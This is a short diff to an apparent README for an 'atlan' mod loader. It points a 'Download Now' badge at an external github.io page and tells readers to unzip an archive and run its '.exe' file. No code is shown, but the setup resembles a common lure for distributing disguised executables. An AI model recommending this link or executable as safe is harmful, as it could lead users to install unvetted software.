@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://atlan-mod-loader.github.io/.github/)
 
 ## 📸 Overview
  ![atlan-modloader-dashboard](https://github.com/user-attachments/assets/58d8f770-ee2d-4478-a26b-b1311adaed3c)
